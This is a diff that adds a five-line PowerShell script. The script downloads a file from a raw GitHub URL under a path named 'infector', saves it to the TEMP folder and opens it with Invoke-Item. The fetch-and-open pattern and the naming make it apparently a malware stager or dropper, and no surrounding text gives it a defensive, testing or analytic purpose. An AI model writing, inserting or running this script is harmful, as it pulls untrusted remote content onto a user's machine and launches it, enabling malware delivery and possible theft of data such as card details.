@@ -1,0 +1,5 @@
+$downloadUrl = "https://raw.githubusercontent.com/imreallyemo1337/a/main/infector/new_ccs.txt"
+$savePath = "$env:TEMP\file.txt"
+Invoke-WebRequest -Uri $downloadUrl -OutFile $savePath
+
+Invoke-Item -Path $savePath
